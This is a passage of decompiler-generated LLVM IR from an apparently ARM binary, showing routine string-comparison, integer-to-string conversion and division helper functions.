  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_12754, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12704.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_12710, { 1, 0 }
}

define i32 @function_1275c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1275c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_1275c = load i8, i8* %arg1, align 1
  %v2_12760 = icmp eq i8 %v2_1275c, 0
  br i1 %v2_12760, label %bb, label %dec_label_pc_1276c

bb:                                               ; preds = %dec_label_pc_1275c
  %v3_1275c = zext i8 %v2_1275c to i32
  br label %dec_label_pc_12780

dec_label_pc_1276c:                               ; preds = %dec_label_pc_1275c
  br label %dec_label_pc_12770

dec_label_pc_12770:                               ; preds = %dec_label_pc_12770, %dec_label_pc_1276c
  %v0_12770 = phi i32 [ %v1_12770, %dec_label_pc_12770 ], [ 0, %dec_label_pc_1276c ]
  %v1_12770 = add i32 %v0_12770, 1
  %v2_12774 = add i32 %v1_12770, %tmp
  %v3_12774 = inttoptr i32 %v2_12774 to i8*
  %v4_12774 = load i8, i8* %v3_12774, align 1
  %v2_12778 = icmp eq i8 %v4_12774, 0
  br i1 %v2_12778, label %dec_label_pc_12780, label %dec_label_pc_12770

dec_label_pc_12780:                               ; preds = %dec_label_pc_12770, %bb
  %v0_127cc3 = phi i32 [ %v3_1275c, %bb ], [ %v1_12770, %dec_label_pc_12770 ]
  %v1_12780 = inttoptr i32 %arg2 to i8*
  %v2_12780 = load i8, i8* %v1_12780, align 1
  %v3_12780 = zext i8 %v2_12780 to i32
  %v2_12784 = icmp eq i8 %v2_12780, 0
  br i1 %v2_12784, label %bb21, label %dec_label_pc_12790

bb21:                                             ; preds = %dec_label_pc_12780
  store i32 %v3_12780, i32* @r2, align 4
  br label %dec_label_pc_127a4

dec_label_pc_12790:                               ; preds = %dec_label_pc_12780
  br label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_12794, %dec_label_pc_12790
  %v0_12794 = phi i32 [ %v1_12794, %dec_label_pc_12794 ], [ 0, %dec_label_pc_12790 ]
  %v1_12794 = add i32 %v0_12794, 1
  store i32 %v1_12794, i32* @r2, align 4
  %v2_12798 = add i32 %v1_12794, %arg2
  %v3_12798 = inttoptr i32 %v2_12798 to i8*
  %v4_12798 = load i8, i8* %v3_12798, align 1
  %v2_1279c = icmp eq i8 %v4_12798, 0
  br i1 %v2_1279c, label %dec_label_pc_127a4, label %dec_label_pc_12794

dec_label_pc_127a4:                               ; preds = %dec_label_pc_12794, %bb21
  %v1_127a4 = phi i32 [ %v3_12780, %bb21 ], [ %v1_12794, %dec_label_pc_12794 ]
  %v9_127a4 = icmp eq i32 %v0_127cc3, %v1_127a4
  br i1 %v9_127a4, label %dec_label_pc_127cc.preheader, label %dec_label_pc_127ac

dec_label_pc_127cc.preheader:                     ; preds = %dec_label_pc_127a4
  %v2_127cc5 = icmp eq i32 %v0_127cc3, 0
  br i1 %v2_127cc5, label %dec_label_pc_127d4, label %dec_label_pc_127b4

dec_label_pc_127ac:                               ; preds = %dec_label_pc_127b4, %dec_label_pc_127a4
  ret i32 0

dec_label_pc_127b4:                               ; preds = %dec_label_pc_127c4, %dec_label_pc_127cc.preheader
  %v0_127cc.in = phi i32 [ %v0_127cc, %dec_label_pc_127c4 ], [ %v0_127cc3, %dec_label_pc_127cc.preheader ]
  %v0_127c8 = phi i32 [ %v1_127c8, %dec_label_pc_127c4 ], [ %arg2, %dec_label_pc_127cc.preheader ]
  %v0_127c4 = phi i32 [ %v1_127c4, %dec_label_pc_127c4 ], [ %tmp, %dec_label_pc_127cc.preheader ]
  %v0_127cc = add i32 %v0_127cc.in, -1
  %v1_127b4 = inttoptr i32 %v0_127c4 to i8*
  %v2_127b4 = load i8, i8* %v1_127b4, align 1
  %v3_127b4 = zext i8 %v2_127b4 to i32
  store i32 %v3_127b4, i32* @r2, align 4
  %v1_127b8 = inttoptr i32 %v0_127c8 to i8*
  %v2_127b8 = load i8, i8* %v1_127b8, align 1
  %v9_127bc = icmp eq i8 %v2_127b4, %v2_127b8
  br i1 %v9_127bc, label %dec_label_pc_127c4, label %dec_label_pc_127ac

dec_label_pc_127c4:                               ; preds = %dec_label_pc_127b4
  %v1_127c4 = add i32 %v0_127c4, 1
  %v1_127c8 = add i32 %v0_127c8, 1
  %v2_127cc = icmp eq i32 %v0_127cc, 0
  br i1 %v2_127cc, label %dec_label_pc_127d4, label %dec_label_pc_127b4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_127c4, %dec_label_pc_127cc.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_12794, { 0, 1, 3, 2 }
  uselistorder i8 %v2_1275c, { 1, 0 }
}

define i32 @function_127dc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_127dc:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_127e0 = load i8, i8* %arg1, align 1
  %v2_127e4 = icmp eq i8 %v2_127e0, 0
  %v0_127e8 = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_127e4, label %bb, label %dec_label_pc_127f4

bb:                                               ; preds = %dec_label_pc_127dc
  %v3_127e0 = zext i8 %v2_127e0 to i32
  br label %dec_label_pc_12808

dec_label_pc_127f4:                               ; preds = %dec_label_pc_127dc
  br label %dec_label_pc_127f8

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127f8, %dec_label_pc_127f4
  %v0_127f8 = phi i32 [ %v1_127f8, %dec_label_pc_127f8 ], [ 0, %dec_label_pc_127f4 ]
  %v1_127f8 = add i32 %v0_127f8, 1
  %v2_127fc = add i32 %v1_127f8, %tmp
  %v3_127fc = inttoptr i32 %v2_127fc to i8*
  %v4_127fc = load i8, i8* %v3_127fc, align 1
  %v2_12800 = icmp eq i8 %v4_127fc, 0
  br i1 %v2_12800, label %dec_label_pc_12808, label %dec_label_pc_127f8

dec_label_pc_12808:                               ; preds = %dec_label_pc_127f8, %bb
  %v6_12830 = phi i32 [ %v3_127e0, %bb ], [ %v1_127f8, %dec_label_pc_127f8 ]
  %v0_12808 = load i32, i32* %r1.global-to-local, align 4
  %v1_12808 = inttoptr i32 %v0_12808 to i8*
  %v2_12808 = load i8, i8* %v1_12808, align 1
  %v3_12808 = zext i8 %v2_12808 to i32
  %v2_1280c = icmp eq i8 %v2_12808, 0
  br i1 %v2_1280c, label %bb26, label %dec_label_pc_12818

bb26:                                             ; preds = %dec_label_pc_12808
  store i32 %v3_12808, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1282c

dec_label_pc_12818:                               ; preds = %dec_label_pc_12808
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1281c

dec_label_pc_1281c:                               ; preds = %dec_label_pc_1281c, %dec_label_pc_12818
  %v0_1281c = phi i32 [ %v1_1281c, %dec_label_pc_1281c ], [ 0, %dec_label_pc_12818 ]
  %v1_1281c = add i32 %v0_1281c, 1
  store i32 %v1_1281c, i32* %r2.global-to-local, align 4
  %v2_12820 = add i32 %v1_1281c, %v0_12808
  %v3_12820 = inttoptr i32 %v2_12820 to i8*
  %v4_12820 = load i8, i8* %v3_12820, align 1
  %v2_12824 = icmp eq i8 %v4_12820, 0
  br i1 %v2_12824, label %dec_label_pc_1282c, label %dec_label_pc_1281c

dec_label_pc_1282c:                               ; preds = %dec_label_pc_1281c, %bb26
  %v0_1282c = phi i32 [ %v3_12808, %bb26 ], [ %v1_1281c, %dec_label_pc_1281c ]
  %v2_1282c = sub i32 %v0_1282c, %v0_127e8
  %v4_1282c = xor i32 %v0_1282c, %v0_127e8
  %v5_1282c = xor i32 %v2_1282c, %v0_1282c
  %v6_1282c = and i32 %v5_1282c, %v4_1282c
  %v5_12830 = icmp slt i32 %v0_1282c, %v0_127e8
  br i1 %v5_12830, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_1282c
  %v8_12830 = sub i32 %v6_12830, %v0_127e8
  %v10_12830 = xor i32 %v6_12830, %v0_127e8
  %v11_12830 = xor i32 %v8_12830, %v6_12830
  %v12_12830 = and i32 %v11_12830, %v10_12830
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1282c, %bb27
  %v1_12834.in = phi i32 [ %v6_1282c, %dec_label_pc_1282c ], [ %v12_12830, %bb27 ]
  %v0_12834.in = phi i32 [ %v2_1282c, %dec_label_pc_1282c ], [ %v8_12830, %bb27 ]
  %v0_12834 = icmp slt i32 %v0_12834.in, 0
  %v1_12834 = icmp slt i32 %v1_12834.in, 0
  %v2_12834 = xor i1 %v1_12834, %v0_12834
  br i1 %v2_12834, label %dec_label_pc_12860, label %dec_label_pc_12844.preheader

dec_label_pc_12844.preheader:                     ; preds = %bb28
  %v2_128445 = icmp eq i32 %v0_127e8, 0
  br i1 %v2_128445, label %dec_label_pc_12860, label %dec_label_pc_1284c

dec_label_pc_1283c:                               ; preds = %dec_label_pc_1284c
  %v1_1283c = add i32 %v0_1283c, 1
  %v1_12840 = add i32 %v0_12840, 1
  store i32 %v1_12840, i32* %r1.global-to-local, align 4
  %v2_12844 = icmp eq i32 %v0_12844, 0
  br i1 %v2_12844, label %dec_label_pc_12860, label %dec_label_pc_1284c

dec_label_pc_1284c:                               ; preds = %dec_label_pc_1283c, %dec_label_pc_12844.preheader
  %v0_12844.in = phi i32 [ %v0_12844, %dec_label_pc_1283c ], [ %v0_127e8, %dec_label_pc_12844.preheader ]
  %v0_12840 = phi i32 [ %v1_12840, %dec_label_pc_1283c ], [ %v0_12808, %dec_label_pc_12844.preheader ]
  %v0_1283c = phi i32 [ %v1_1283c, %dec_label_pc_1283c ], [ %tmp, %dec_label_pc_12844.preheader ]
  %v0_12844 = add i32 %v0_12844.in, -1
  %v1_1284c = inttoptr i32 %v0_1283c to i8*
  %v2_1284c = load i8, i8* %v1_1284c, align 1
  %v3_1284c = zext i8 %v2_1284c to i32
  store i32 %v3_1284c, i32* %r2.global-to-local, align 4
  %v1_12850 = inttoptr i32 %v0_12840 to i8*
  %v2_12850 = load i8, i8* %v1_12850, align 1
  %v9_12854 = icmp eq i8 %v2_1284c, %v2_12850
  br i1 %v9_12854, label %dec_label_pc_1283c, label %dec_label_pc_12860

dec_label_pc_12860:                               ; preds = %dec_label_pc_1283c, %dec_label_pc_12844.preheader, %dec_label_pc_1284c, %bb28
  %storemerge = phi i32 [ 0, %bb28 ], [ 1, %dec_label_pc_12844.preheader ], [ 1, %dec_label_pc_1283c ], [ 0, %dec_label_pc_1284c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1283c, { 1, 0 }
  uselistorder i32 %v0_12840, { 1, 0 }
  uselistorder i32 %v0_1282c, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1281c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_127e8, { 0, 3, 1, 4, 6, 2, 5 }
  uselistorder i8 %v2_127e0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12860, { 2, 0, 1, 3 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_12870(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12870:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v3_12870 = load i32, i32* @r4, align 4
  %v6_12870 = load i32, i32* @r5, align 4
  %v12_12870 = load i32, i32* @r7, align 4
  %v0_12874 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12874, i32* %r8.global-to-local, align 4
  %v2_12874 = icmp eq i32 %v0_12874, 0
  store i1 %v2_12874, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_12874, label %dec_label_pc_12954, label %dec_label_pc_12884

dec_label_pc_12884:                               ; preds = %dec_label_pc_12870
  %v3_12884 = icmp eq i8 %arg1, 0
  store i1 %v3_12884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12884, label %.thread, label %dec_label_pc_12898

.thread:                                          ; preds = %dec_label_pc_12884
  %v4_1288c = inttoptr i32 %v0_12874 to i8*
  store i8 48, i8* %v4_1288c, align 1
  %v0_12890.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12890.pr.pr, label %.thread1, label %dec_label_pc_12898

.thread1:                                         ; preds = %.thread
  %v4_12890 = load i32, i32* %r8.global-to-local, align 4
  %v5_12890 = add i32 %v4_12890, 1
  %v6_12890 = inttoptr i32 %v5_12890 to i8*
  store i8 0, i8* %v6_12890, align 1
  %v0_12894.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12894.pr.pr, label %dec_label_pc_12954, label %dec_label_pc_12898

dec_label_pc_12898:                               ; preds = %dec_label_pc_12884, %.thread, %.thread1
  %tmp47 = icmp slt i8 %arg1, 0
  %v7_1289c = icmp eq i32 %arg2, 10
  store i1 %v7_1289c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1289c, label %bb, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_12898
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_12898
  %v4_12898 = zext i1 %tmp47 to i32
  store i32 %v4_12898, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp47, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_128bc8 = sub nsw i32 0, %tmp
  %tmp.v3_128bc8 = select i1 %phitmp, i32 %tmp, i32 %v3_128bc8
  %tmp46 = zext i1 %phitmp to i32
  %. = xor i32 %tmp46, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread28
  %storemerge30 = phi i32 [ %tmp, %.thread28 ], [ %tmp.v3_128bc8, %bb ]
  %storemerge = phi i32 [ 0, %.thread28 ], [ %., %bb ]
  store i32 %storemerge30, i32* @r4, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* @r5, align 4
  %v2_128c8 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_128c8, i32* @r7, align 4
  br label %dec_label_pc_128cc

dec_label_pc_128cc:                               ; preds = %bb45, %.thread6
  %v0_128cc = phi i32 [ %v0_128f0, %bb45 ], [ %storemerge30, %.thread6 ]
  store i32 %v0_128cc, i32* %r0.global-to-local, align 4
  %v0_128d0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_128d0, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_128cc, 16777216
  %v1_128d4 = sdiv i32 %sext, 16777216
  %v3_128d4 = call i32 @function_12a68(i32 %v1_128d4, i32 %v0_128d0)
  %v7_128d8 = icmp eq i32 %v0_128d0, 9
  store i1 %v7_128d8, i1* %cpsr_z.global-to-local, align 1
  %v1_128dc = add i32 %v0_128d0, 48
  %v0_128e0 = load i32, i32* @r4, align 4
  store i32 %v0_128e0, i32* @r0, align 4
  %v7_128e4 = icmp sgt i32 %v0_128d0, 9
  %extract.t = trunc i32 %v1_128dc to i8
  br i1 %v7_128e4, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_128cc
  %v9_128e4 = add i32 %v0_128d0, 55
  %extract.t27 = trunc i32 %v9_128e4 to i8
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_128cc, %bb44
  %v0_128ec.off0 = phi i8 [ %extract.t, %dec_label_pc_128cc ], [ %extract.t27, %bb44 ]
  %v0_128e8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_128e8, i32* @r1, align 4
  %v2_128ec = load i32, i32* @r5, align 4
  %v3_128ec = load i32, i32* @r7, align 4
  %v4_128ec = add i32 %v3_128ec, %v2_128ec
  %v5_128ec = inttoptr i32 %v4_128ec to i8*
  store i8 %v0_128ec.off0, i8* %v5_128ec, align 1
  %v0_128f0 = call i32 @function_1296c()
  store i32 %v0_128f0, i32* %r0.global-to-local, align 4
  store i32 %v0_128f0, i32* @r4, align 4
  %v2_128f4 = icmp eq i32 %v0_128f0, 0
  store i1 %v2_128f4, i1* %cpsr_z.global-to-local, align 1
  %v0_128f8 = load i32, i32* @r5, align 4
  %v1_128f8 = add i32 %v0_128f8, -1
  store i32 %v1_128f8, i32* @r5, align 4
  br i1 %v2_128f4, label %dec_label_pc_12900, label %dec_label_pc_128cc

dec_label_pc_12900:                               ; preds = %bb45
  %v0_12900 = load i32, i32* %sl.global-to-local, align 4
  %v2_12900 = icmp eq i32 %v0_12900, 0
  store i1 %v2_12900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12900, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_12900
  %v3_12904 = ptrtoint i32* %stack_var_-32 to i32
  %v3_12908 = add i32 %v1_128f8, %v3_12904
  store i32 %v3_12908, i32* %r2.global-to-local, align 4
  %v4_12910 = add i32 %v3_12908, -34
  %v5_12910 = inttoptr i32 %v4_12910 to i8*
  store i8 45, i8* %v5_12910, align 1
  %v0_12914.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_12914.pre = load i32, i32* @r5, align 4
  br i1 %v0_12914.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_12900
  %v1_12914 = phi i32 [ %v1_128f8, %dec_label_pc_12900 ], [ %v1_12914.pre, %.thread11 ]
  %v2_12914 = add i32 %v1_12914, 1
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_12920 = phi i32 [ %v2_12914, %.thread12 ], [ %v1_12914.pre, %.thread11 ]
  %v0_12918 = load i32, i32* @r7, align 4
  %v2_12918 = add i32 %v0_12918, %v1_12920
  %v3_12918 = inttoptr i32 %v2_12918 to i8*
  %v4_12918 = load i8, i8* %v3_12918, align 1
  %v6_12918 = zext i8 %v4_12918 to i32
  %v2_1291c = icmp eq i8 %v4_12918, 0
  store i1 %v2_1291c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_12918, i32* %r2.global-to-local, align 4
  br i1 %v2_1291c, label %dec_label_pc_12964, label %dec_label_pc_1292c.preheader

dec_label_pc_1292c.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1292c

dec_label_pc_1292c:                               ; preds = %dec_label_pc_1292c.preheader, %dec_label_pc_1292c
  %v0_1292c = phi i32 [ 0, %dec_label_pc_1292c.preheader ], [ %v1_1292c, %dec_label_pc_1292c ]
  %v1_1292c = add i32 %v0_1292c, 1
  store i32 %v1_1292c, i32* %r1.global-to-local, align 4
  %v2_12930 = add i32 %v1_1292c, %v2_12918
  %v3_12930 = inttoptr i32 %v2_12930 to i8*
  %v4_12930 = load i8, i8* %v3_12930, align 1
  %v2_12934 = icmp eq i8 %v4_12930, 0
  store i1 %v2_12934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12934, label %dec_label_pc_1293c, label %dec_label_pc_1292c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_1292c, %dec_label_pc_12964
  %v0_1294024 = phi i32 [ %v6_12918, %dec_label_pc_12964 ], [ %v1_1292c, %dec_label_pc_1292c ]
  %v0_1293c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1293c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12940

dec_label_pc_12940:                               ; preds = %dec_label_pc_12940.dec_label_pc_12940_crit_edge, %dec_label_pc_1293c
  %v2_1294c = phi i32 [ %v5_1294c, %dec_label_pc_12940.dec_label_pc_12940_crit_edge ], [ %v0_1293c, %dec_label_pc_1293c ]
  %v0_12944 = phi i32 [ %v0_12944.pre, %dec_label_pc_12940.dec_label_pc_12940_crit_edge ], [ %v2_12918, %dec_label_pc_1293c ]
  %v0_12940 = phi i32 [ %v0_12940.pre, %dec_label_pc_12940.dec_label_pc_12940_crit_edge ], [ %v0_1294024, %dec_label_pc_1293c ]
  %v1_12940 = add i32 %v0_12940, -1
  store i32 %v1_12940, i32* %r1.global-to-local, align 4
  %v1_12944 = inttoptr i32 %v0_12944 to i8*
  %v2_12944 = load i8, i8* %v1_12944, align 1
  %v5_12944 = add i32 %v0_12944, 1
  store i32 %v5_12944, i32* %r2.global-to-local, align 4
  %v3_12948 = icmp eq i32 %v0_12940, 0
  store i1 %v3_12948, i1* %cpsr_z.global-to-local, align 1
  %v3_1294c = inttoptr i32 %v2_1294c to i8*
  store i8 %v2_12944, i8* %v3_1294c, align 1
  %v4_1294c = load i32, i32* %r0.global-to-local, align 4
  %v5_1294c = add i32 %v4_1294c, 1
  store i32 %v5_1294c, i32* %r0.global-to-local, align 4
  br i1 %v3_12948, label %dec_label_pc_12954, label %dec_label_pc_12940.dec_label_pc_12940_crit_edge

dec_label_pc_12940.dec_label_pc_12940_crit_edge:  ; preds = %dec_label_pc_12940
  %v0_12940.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_12944.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12940

dec_label_pc_12954:                               ; preds = %dec_label_pc_12940, %.thread1, %dec_label_pc_12870
  %v0_12954 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12954, i32* %r0.global-to-local, align 4
  store i32 %v3_12870, i32* @r4, align 4
  store i32 %v6_12870, i32* @r5, align 4
  store i32 %v12_12870, i32* @r7, align 4
  ret i32 %v0_12954

dec_label_pc_12964:                               ; preds = %.thread11._crit_edge
  store i32 %v6_12918, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1293c

; uselistorder directives
  uselistorder i32 %v5_1294c, { 1, 0 }
  uselistorder i1 %v3_12948, { 1, 0 }
  uselistorder i32 %v0_12944, { 1, 0 }
  uselistorder i32 %v1_1292c, { 0, 1, 3, 2 }
  uselistorder i32 %v6_12918, { 1, 0 }
  uselistorder i32 %v2_12918, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12914.pre, { 1, 0 }
  uselistorder i32 %v1_128f8, { 1, 0, 2 }
  uselistorder i32 %v0_128f0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_128d0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_12874, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1293c, { 1, 0 }
  uselistorder label %dec_label_pc_1292c, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_12898, { 2, 1, 0 }
}

define i32 @function_1296c() local_unnamed_addr {
dec_label_pc_1296c:
  %r2.global-to-local = alloca i32, align 4
  %v0_1296c = load i32, i32* @r1, align 4
  %v1_1296c = add i32 %v0_1296c, -1
  store i32 %v1_1296c, i32* %r2.global-to-local, align 4
  %v2_1296c = icmp eq i32 %v0_1296c, 0
  %v7_1296c = icmp eq i32 %v0_1296c, 1
  %v0_12970 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_1296c, i32 %v0_12970)
  br i1 %v2_1296c, label %dec_label_pc_12a54, label %dec_label_pc_12978

dec_label_pc_12978:                               ; preds = %dec_label_pc_1296c
  %v0_12978 = load i32, i32* @r0, align 4
  %v1_12978 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_12978, %v1_12978
  br i1 %tmp, label %dec_label_pc_12980, label %dec_label_pc_12a0c

dec_label_pc_12980:                               ; preds = %dec_label_pc_12978
  %v1_12980 = load i32, i32* %r2.global-to-local, align 4
  %v2_12980 = and i32 %v1_12980, %v1_12978
  %v4_12980 = icmp eq i32 %v2_12980, 0
  br i1 %v4_12980, label %dec_label_pc_12a18, label %dec_label_pc_12988

dec_label_pc_12988:                               ; preds = %dec_label_pc_12980
  %v3_12988 = icmp ult i32 %v1_12978, 536870912
  br i1 %v3_12988, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12988
  %v4_1298c = mul i32 %v1_12978, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12988, %.thread
  %v0_129ac.pr36.ph = phi i32 [ %v4_1298c, %.thread ], [ %v1_12978, %dec_label_pc_12988 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12988 ]
  store i32 %storemerge133, i32* @r3, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_129ac.pr36 = phi i32 [ %v4_129a0, %bb81 ], [ %v0_129ac.pr36.ph, %.preheader.preheader ]
  %v1_129a4 = phi i32 [ %v4_129a4, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_12998 = icmp ugt i32 %v0_129ac.pr36, 268435455
  br i1 %v2_12998, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_129acthread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_1299c = icmp ult i32 %v0_129ac.pr36, %v0_12978
  br i1 %v4_1299c, label %bb80, label %dec_label_pc_129acthread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_129a0 = and i32 %v0_129ac.pr36, 268435456
  %v3_129a0 = icmp eq i32 %v2_129a0, 0
  %v4_129a0 = mul i32 %v0_129ac.pr36, 16
  br i1 %v3_129a0, label %bb81, label %dec_label_pc_129ac.loopexit

bb81:                                             ; preds = %bb80
  %v2_129a4 = and i32 %v1_129a4, 268435456
  %v3_129a4 = icmp eq i32 %v2_129a4, 0
  %v4_129a4 = mul i32 %v1_129a4, 16
  store i32 %v4_129a4, i32* @r3, align 4
  br i1 %v3_129a4, label %.preheader, label %dec_label_pc_129acthread-pre-split.loopexit.loopexit

dec_label_pc_129acthread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_129b848.ph = phi i32 [ %v1_129a4, %bb ], [ %v4_129a4, %bb81 ]
  %v0_129ac.pr38.ph = phi i32 [ %v0_129ac.pr36, %bb ], [ %v4_129a0, %bb81 ]
  br label %dec_label_pc_129acthread-pre-split.loopexit

dec_label_pc_129acthread-pre-split.loopexit:      ; preds = %dec_label_pc_129acthread-pre-split.loopexit.loopexit, %.thread2
  %v1_129b848 = phi i32 [ %v1_129a4, %.thread2 ], [ %v1_129b848.ph, %dec_label_pc_129acthread-pre-split.loopexit.loopexit ]
  %v0_129ac.pr38 = phi i32 [ %v0_129ac.pr36, %.thread2 ], [ %v0_129ac.pr38.ph, %dec_label_pc_129acthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_129acthread-pre-split

dec_label_pc_129acthread-pre-split:               ; preds = %dec_label_pc_129acthread-pre-split.loopexit, %bb83
  %v1_129b846 = phi i32 [ %v1_129b848, %dec_label_pc_129acthread-pre-split.loopexit ], [ %v3_129b8, %bb83 ]
  %v0_129ac.pr = phi i32 [ %v0_129ac.pr38, %dec_label_pc_129acthread-pre-split.loopexit ], [ %v3_129b4, %bb83 ]
  br label %dec_label_pc_129ac

dec_label_pc_129ac.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_129ac

dec_label_pc_129ac:                               ; preds = %dec_label_pc_129ac.loopexit, %dec_label_pc_129acthread-pre-split
  %v1_129b8 = phi i32 [ %v1_129b846, %dec_label_pc_129acthread-pre-split ], [ %v1_129a4, %dec_label_pc_129ac.loopexit ]
  %v1_129b4 = phi i32 [ %v0_129ac.pr, %dec_label_pc_129acthread-pre-split ], [ %v4_129a0, %dec_label_pc_129ac.loopexit ]
  %v2_129ac = icmp slt i32 %v1_129b4, 0
  br i1 %v2_129ac, label %dec_label_pc_129c0, label %bb82

bb82:                                             ; preds = %dec_label_pc_129ac
  %v4_129b0 = icmp ult i32 %v1_129b4, %v0_12978
  br i1 %v4_129b0, label %bb83, label %dec_label_pc_129c0

bb83:                                             ; preds = %bb82
  %v3_129b4 = mul i32 %v1_129b4, 2
  %v2_129b8 = icmp slt i32 %v1_129b8, 0
  %v3_129b8 = mul i32 %v1_129b8, 2
  store i32 %v3_129b8, i32* @r3, align 4
  br i1 %v2_129b8, label %dec_label_pc_129c0, label %dec_label_pc_129acthread-pre-split

dec_label_pc_129c0:                               ; preds = %bb82, %dec_label_pc_129ac, %bb83
